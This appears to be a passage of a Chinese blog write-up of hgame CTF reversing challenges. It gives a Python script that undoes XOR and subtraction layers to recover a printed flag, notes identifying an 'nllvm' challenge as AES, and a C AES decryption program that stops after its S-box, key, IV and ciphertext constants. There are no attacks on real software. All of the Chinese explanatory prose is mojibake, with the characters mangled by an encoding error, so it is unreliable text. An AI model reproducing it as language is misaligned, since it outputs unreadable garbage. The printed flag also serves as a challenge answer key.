<p>è¿™é‡Œåæ§½ä¸€ä¸‹æˆ‘è‡ªå·±å§ï¼Œä¼ªä»£ç å·²ç»é‚£ä¹ˆè¯¡å¼‚äº†ï¼Œæˆ‘ä¸ºä»€ä¹ˆè¿˜è¦æŠŠä¼ªä»£ç ä¿®æ”¹æˆæˆ‘è‡ªå·±çš„ä¼ªä»£ç â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ç›´æ¥çœ‹idaçš„ä¼ªä»£ç çœ‹ç†Ÿæ‚‰äº†åº”è¯¥å°±å¯ä»¥äº†å§ï¼Œå¦‚æœçœŸçš„è¦å†™æˆæˆ‘è‡ªå·±çš„ä¼ªä»£ç çš„è¯ï¼Œä¼°è®¡å¾—æ¶‰åŠåˆ°å¾ˆå¤šé«˜çº§çš„é‡æ„æ–¹æ³•äº†ï¼Œè¦æ˜¯çœŸçš„èƒ½é‚£ä¹ˆåšçš„è¯ï¼Œæˆ‘ä¹Ÿå¯ä»¥å†™ä¸ªIDAäº†hhhhaï¼Œæ‰€ä»¥ç»“è®ºå°±æ˜¯æˆ‘åº”è¯¥åšä¸åˆ°</p>
<p>çœ‹å‡ºç¬¬ä¸€ä¸ªé˜¶æ®µæ˜¯å¼‚æˆ–ï¼Œç¬¬äºŒä¸ªé˜¶æ®µæ˜¯å‡å»è«ä¸ªå€¼ï¼Œå› æ­¤æˆ‘ä»¬dumpä¸‹æ¥è¿™ä¸ªå€¼å°±å¥½äº†</p>
<p>ä¸Šè„šæœ¬</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">encrypted   <span class="token operator">=</span><span class="token string">b'\xCF\xBF\x80\x3B\xF6\xAF\x7E\x02\x24\xED\x70\x3A\xF4\xEB\x7A\x4A\xE7\xF7\xA2\x67\x17\xF0\xC6\x76\x36\xE8\xAD\x82\x2E\xDB\xB7\x4F\xE6\x09'</span>
xor_key     <span class="token operator">=</span><span class="token string">b'\xFE\x21\x44\x67\x8A\xAD\xD0\xF3\x16\x39\x5C\x7F\xA2\xC5\xE8\x0B\x2E\x51\x74\x97\xBA\xDD\x00\x23\x46\x69\x8C\xAF\xD2\xF5\x18\x3B\x5E\x81'</span>
decrease_key<span class="token operator">=</span><span class="token string">b'\x7A\x1A\xBA\x5A\xFA\x9A\x3A\xDA\x7A\x1A\xBA\x5A\xFA\x9A\x3A\xDA\x7A\x1A\xBA\x5A\xFA\x9A\x3A\xDA\x7A\x1A\xBA\x5A\xFA\x9A\x3A\xDA\x7A\x1A'</span>
decrypted   <span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    temp_num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>decrease_key<span class="token punctuation">[</span><span class="token number">33</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    temp_num <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">0xFF</span>
    temp_num <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>xor_key<span class="token punctuation">[</span><span class="token number">33</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    decrypted <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp_num<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>decrypted<span class="token punctuation">)</span>
<span class="token comment">#decrypted = â€œhgame&#123;w0W!itS_CpP_wItH_little_vM!&#125;â€</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>çœ‹æ¥è¿˜æœ‰å¥½å¤šå¯ä»¥ç¢ç£¨çš„äº†ï¼Œæ€ªä¸å¾—è¿™é“é¢˜æœ‰äººåšè¿™ä¹ˆå¿«ã€‚è¿™ä¸ªè™šæ‹Ÿæœºçš„æŒ‡ä»¤çœŸçš„ä¸æ˜¯ç®€å•çš„æŒ‡ä»¤ï¼Œæˆ‘æœ¬æ¥ä»¥ä¸ºæ˜¯ç›¸å½“äºpush,popè¿™ç§ï¼Œæœ€åæƒ³ä¸€ä¸‹åº”è¯¥æ˜¯ç›¸å½“äºä¸€ä¸ªå‡½æ•°äº†ï¼Œç„¶ååˆå› ä¸ºä¸€äº›äº¤å‰çš„å˜é‡çœ‹èµ·æ¥æ¯”è¾ƒå¤æ‚ï¼Œè¿™ç‚¹çœ‹æ¥å¾ˆå€¼å¾—æ€è€ƒäº†ã€‚</p>
<p>x64æ—¥å¿—dumpæŒºå¥½ç”¨çš„ï¼Œ<a href="https://help.x64dbg.com/en/latest/introduction/Formatting.html">https://help.x64dbg.com/en/latest/introduction/Formatting.html</a></p>
<h4 id="nllvm"><a href="#nllvm" class="headerlink" title="nllvm"></a>nllvm</h4><p>è™½è¯´å’Œ llvm å’Œ ollvm æœ‰ä¸€å®šå…³ç³»ï¼Œä½†æ˜¯è¿™ä¸ªæ··æ·†åªæ˜¯å•çº¯çš„å¢é•¿ï¼Œç¨‹åºæµå¹¶æ²¡æœ‰æ··æ·†</p>
<p>æ ¹æ®ç¨‹åºæµï¼Œæˆ–è€…æ ¹æ®åŠ å¯†è¿‡ç¨‹ä¸­ <strong>sbox</strong> ï¼Œå¯ä»¥åˆ¤æ–­å‡ºæ˜¯ aes ï¼Œä½†æ˜¯æ˜¯ä¸æ˜¯ aes å˜ç§å‘¢ï¼Œç”±äºæˆ‘å¯¹aes-256 cbc æœ‰æ‰€è¯¯è§£ï¼Œä»¥ä¸ºkeyçš„é•¿åº¦ä¸èƒ½æ˜¯ 64 å­—èŠ‚ï¼Œå¯¼è‡´æˆ‘åªå¥½æ‰‹æ’¸è¿™é“é¢˜ï¼Œä¸è¿‡æƒ³æ¥ï¼Œå¦‚æœè¿™æ ·å­çš„è¯æˆ‘ä»¥åå°±èƒ½å¯¹ä»˜å˜ç§äº†ï¼Œè™½ç„¶ã€‚ã€‚ã€‚å»ºç«‹åœ¨æˆ‘è¢«è‡ªå·±å‘çš„åŸºç¡€ä¸Šã€‚</p>
<p>ä¸è¿‡ç”±äºæ˜¯æ•°è®ºçš„ä¸œè¥¿ï¼Œæˆ‘ä¹Ÿè¦markä¸€ä¸‹ã€‚åœ¨ GF(2^8) åŸŸä¸Šï¼ŒåŠ æ³•å’Œä¹˜æ³•ä¸æ˜¯æˆ‘ä»¬ä¸€èˆ¬çš„åŸŸçš„åŠ æ³•ï¼Œä¹˜æ³•åˆ™éœ€è¦å·¦ç§»ä¸€ä½ï¼Œç„¶åå†åˆ¤æ–­æ­£è´Ÿ,ä¹˜ä»¥ 0x1b ä¹‹ç±»ï¼Œæ­£å¦‚ä¸‹é¢çš„ Multiply å®å®šä¹‰ã€‚è€Œ xtime æ˜¯ç”¨äºä¹˜æ³•ï¼Œè¯¦ç»†çš„è§<a href="https://www.cnblogs.com/Jeely/p/11724506.html%EF%BC%8C%E5%85%B6%E5%AE%9E%E6%89%8B%E6%92%B8">https://www.cnblogs.com/Jeely/p/11724506.htmlï¼Œå…¶å®æ‰‹æ’¸</a> aes æˆ‘è§‰å¾—è¿˜æ˜¯æŒºæœ‰ä»·å€¼çš„ã€‚å› ä¸ºæˆ‘å¤§ä¸€ä¸‹ hgame ä¸­ä¹Ÿåšè¿‡ä¸€é“ï¼Œé‚£é“æˆ‘æ˜¯ç”¨ä»£ç è¾…åŠ©æ‰‹ç®—å¾—åˆ°çš„ flag ï¼Œç—›è‹¦å¾—å¾ˆã€‚ã€‚ã€‚ä¸è¿‡æ„Ÿè§‰æ•°è®ºå¥½é‡è¦å•Šã€‚ã€‚ã€‚å¯èƒ½æˆ‘æ˜¯ä¸€ä¸ªå¯†ç æ‰‹ 2333</p>
<p>å¦‚æœè¦å¤ç°çš„è¯ä¸€ç§å¯èƒ½å°±æ˜¯ç”¨å®å‡½æ•°ï¼Œåœ¨æ²¡æœ‰ä»€ä¹ˆä¼˜åŒ–çš„æƒ…å†µä¸‹åº”è¯¥æ˜¯èƒ½è®©å‡½æ•°å¦‚æ­¤ä¹‹é•¿ï¼Œè¿˜æœ‰ä¸€ç§å°±æ˜¯ä½¿ç”¨ä¸€äº›æ··æ·†çš„å·¥å…·ï¼Œå¦‚ ollvm è¿™ç§ï¼Œè¿™ç§åº”è¯¥å°±è¦è°ƒè¯•åˆ†æäº†ã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">Multiply</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>                                </span><span class="token punctuation">\</span>
      <span class="token expression"><span class="token punctuation">(</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> x<span class="token punctuation">)</span> <span class="token operator">^</span>                              </span><span class="token punctuation">\</span>
      <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">1</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">xtime</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span>                       </span><span class="token punctuation">\</span>
      <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">2</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">xtime</span><span class="token punctuation">(</span><span class="token function">xtime</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span>                </span><span class="token punctuation">\</span>
      <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">3</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">xtime</span><span class="token punctuation">(</span><span class="token function">xtime</span><span class="token punctuation">(</span><span class="token function">xtime</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span>         </span><span class="token punctuation">\</span>
      <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">4</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">xtime</span><span class="token punctuation">(</span><span class="token function">xtime</span><span class="token punctuation">(</span><span class="token function">xtime</span><span class="token punctuation">(</span><span class="token function">xtime</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   </span><span class="token punctuation">\</span>
</span>
<span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token class-name">uint8_t</span> rsbox<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x6a</span><span class="token punctuation">,</span> <span class="token number">0xd5</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9e</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xf3</span><span class="token punctuation">,</span> <span class="token number">0xd7</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span>
        <span class="token number">0x7c</span><span class="token punctuation">,</span> <span class="token number">0xe3</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x9b</span><span class="token punctuation">,</span> <span class="token number">0x2f</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x8e</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0xc4</span><span class="token punctuation">,</span> <span class="token number">0xde</span><span class="token punctuation">,</span> <span class="token number">0xe9</span><span class="token punctuation">,</span> <span class="token number">0xcb</span><span class="token punctuation">,</span>
        <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x7b</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0xa6</span><span class="token punctuation">,</span> <span class="token number">0xc2</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x3d</span><span class="token punctuation">,</span> <span class="token number">0xee</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x0b</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0xfa</span><span class="token punctuation">,</span> <span class="token number">0xc3</span><span class="token punctuation">,</span> <span class="token number">0x4e</span><span class="token punctuation">,</span>
        <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x2e</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0xb2</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x5b</span><span class="token punctuation">,</span> <span class="token number">0xa2</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x6d</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0xd1</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span>
        <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0xd4</span><span class="token punctuation">,</span> <span class="token number">0xa4</span><span class="token punctuation">,</span> <span class="token number">0x5c</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0xb6</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span>
        <span class="token number">0x6c</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0xfd</span><span class="token punctuation">,</span> <span class="token number">0xed</span><span class="token punctuation">,</span> <span class="token number">0xb9</span><span class="token punctuation">,</span> <span class="token number">0xda</span><span class="token punctuation">,</span> <span class="token number">0x5e</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xa7</span><span class="token punctuation">,</span> <span class="token number">0x8d</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span>
        <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token number">0xab</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x8c</span><span class="token punctuation">,</span> <span class="token number">0xbc</span><span class="token punctuation">,</span> <span class="token number">0xd3</span><span class="token punctuation">,</span> <span class="token number">0x0a</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0xe4</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0xb8</span><span class="token punctuation">,</span> <span class="token number">0xb3</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span>
        <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x1e</span><span class="token punctuation">,</span> <span class="token number">0x8f</span><span class="token punctuation">,</span> <span class="token number">0xca</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x0f</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0xc1</span><span class="token punctuation">,</span> <span class="token number">0xaf</span><span class="token punctuation">,</span> <span class="token number">0xbd</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span>
        <span class="token number">0x3a</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x4f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xea</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0xf2</span><span class="token punctuation">,</span> <span class="token number">0xcf</span><span class="token punctuation">,</span> <span class="token number">0xce</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> <span class="token number">0xb4</span><span class="token punctuation">,</span> <span class="token number">0xe6</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span>
        <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0xac</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xe7</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xe2</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">,</span> <span class="token number">0x1c</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xdf</span><span class="token punctuation">,</span> <span class="token number">0x6e</span><span class="token punctuation">,</span>
        <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0xf1</span><span class="token punctuation">,</span> <span class="token number">0x1a</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x1d</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xc5</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x6f</span><span class="token punctuation">,</span> <span class="token number">0xb7</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0xaa</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span>
        <span class="token number">0xfc</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x3e</span><span class="token punctuation">,</span> <span class="token number">0x4b</span><span class="token punctuation">,</span> <span class="token number">0xc6</span><span class="token punctuation">,</span> <span class="token number">0xd2</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x9a</span><span class="token punctuation">,</span> <span class="token number">0xdb</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token number">0xfe</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0xcd</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0xf4</span><span class="token punctuation">,</span>
        <span class="token number">0x1f</span><span class="token punctuation">,</span> <span class="token number">0xdd</span><span class="token punctuation">,</span> <span class="token number">0xa8</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0xc7</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xb1</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xec</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span>
        <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x7f</span><span class="token punctuation">,</span> <span class="token number">0xa9</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0xb5</span><span class="token punctuation">,</span> <span class="token number">0x4a</span><span class="token punctuation">,</span> <span class="token number">0x0d</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span> <span class="token number">0xe5</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0xc9</span><span class="token punctuation">,</span> <span class="token number">0x9c</span><span class="token punctuation">,</span> <span class="token number">0xef</span><span class="token punctuation">,</span>
        <span class="token number">0xa0</span><span class="token punctuation">,</span> <span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token number">0x3b</span><span class="token punctuation">,</span> <span class="token number">0x4d</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0x2a</span><span class="token punctuation">,</span> <span class="token number">0xf5</span><span class="token punctuation">,</span> <span class="token number">0xb0</span><span class="token punctuation">,</span> <span class="token number">0xc8</span><span class="token punctuation">,</span> <span class="token number">0xeb</span><span class="token punctuation">,</span> <span class="token number">0xbb</span><span class="token punctuation">,</span> <span class="token number">0x3c</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span>
        <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x2b</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x7e</span><span class="token punctuation">,</span> <span class="token number">0xba</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0xd6</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x0c</span><span class="token punctuation">,</span> <span class="token number">0x7d</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token class-name">uint8_t</span> const_key<span class="token punctuation">[</span><span class="token number">257</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x43\x72\x79\x70\x74\x6F\x46\x41\x49\x4C\x55\x52\x45\x66\x6F\x72"</span>
                                 <span class="token string">"\x52\x53\x41\x32\x30\x34\x38\x4B\x65\x79\x21\x21\x21\x21\x21\x21"</span>
                                 <span class="token string">"\xBF\x8F\x84\x8D\xCB\xE0\xC2\xCC\x82\xAC\x97\x9E\xC7\xCA\xF8\xEC"</span>
                                 <span class="token string">"\x94\x27\x00\xFC\xA4\x13\x38\xB7\xC1\x6A\x19\x96\xE0\x4B\x38\xB7"</span>
                                 <span class="token string">"\x0E\x88\x2D\x6C\xC5\x68\xEF\xA0\x47\xC4\x78\x3E\x80\x0E\x80\xD2"</span>
                                 <span class="token string">"\x59\x8C\xCD\x49\xFD\x9F\xF5\xFE\x3C\xF5\xEC\x68\xDC\xBE\xD4\xDF"</span>
                                 <span class="token string">"\xA4\xC0\xB3\xEA\x61\xA8\x5C\x4A\x26\x6C\x24\x74\xA6\x62\xA4\xA6"</span>
                                 <span class="token string">"\x7D\x26\x84\x6D\x80\xB9\x71\x93\xBC\x4C\x9D\xFB\x60\xF2\x49\x24"</span>
                                 <span class="token string">"\x25\xFB\x85\x3A\x44\x53\xD9\x70\x62\x3F\xFD\x04\xC4\x5D\x59\xA2"</span>
                                 <span class="token string">"\x61\x6A\x4F\x57\xE1\xD3\x3E\xC4\x5D\x9F\xA3\x3F\x3D\x6D\xEA\x1B"</span>
                                 <span class="token string">"\x09\x7C\x2A\x1D\x4D\x2F\xF3\x6D\x2F\x10\x0E\x69\xEB\x4D\x57\xCB"</span>
                                 <span class="token string">"\x88\x89\x14\x48\x69\x5A\x2A\x8C\x34\xC5\x89\xB3\x09\xA8\x63\xA8"</span>
                                 <span class="token string">"\xEB\x87\xE8\x1C\xA6\xA8\x1B\x71\x89\xB8\x15\x18\x62\xF5\x42\xD3"</span>
                                 <span class="token string">"\x22\x6F\x38\x2E\x4B\x35\x12\xA2\x7F\xF0\x9B\x11\x76\x58\xF8\xB9"</span>
                                 <span class="token string">"\xC1\xC6\xBE\x24\x67\x6E\xA5\x55\xEE\xD6\xB0\x4D\x8C\x23\xF2\x9E"</span>
                                 <span class="token string">"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F"</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token class-name">uint8_t</span> const_iv<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F"</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token class-name">uint8_t</span> const_data<span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x91\xB3\xC1\xEB\x14\x5D\xD5\xCE\x3A\x1D\x30\xE4\x70\x6C\x6B\xD7"</span>
                                      <span class="token string">"\x69\x78\x79\x02\xA3\xA5\xDF\x1B\xFD\x1C\x02\x89\x14\x20\x7A\xFD"</span>
                                      <span class="token string">"\x24\x52\xF8\xA9\xF9\xF1\x6B\x1C\x0F\x5D\x50\x5B\xEC\x42\xD1\x8C"</span>
                                      <span class="token string">"\xB8\x12\xCF\x2C\xA9\x69\x31\x46\xFD\x9B\xEA\xDE\xC8\xBF\x94\x69"</span><span class="token punctuation">;</span>
<span class="token comment">//                                        "\x92\x16\x48\xBB\x9F\x81\xE0\x47\x7D\xEB\x40\x70\x07\x9E\x2A\x87"</span>
<span class="token comment">//                                      "\x87\xC4\x00\xCB\x2F\xC2\x09\x4C\x9E\x4B\x72\xC6\x84\xDE\x54\x7E"</span>
<span class="token comment">//                                      "\xAB\x5A\xB8\x46\x0A\xBD\x04\x1E\xFE\x62\x0A\xCC\xFB\xA0\x99\xA5"</span>
<span class="token comment">//                                      "\xA2\x83\xF4\x83\x64\x6C\xC1\xE5\xD2\x37\x9E\xC9\x9D\xF0\x28\x6C";</span>


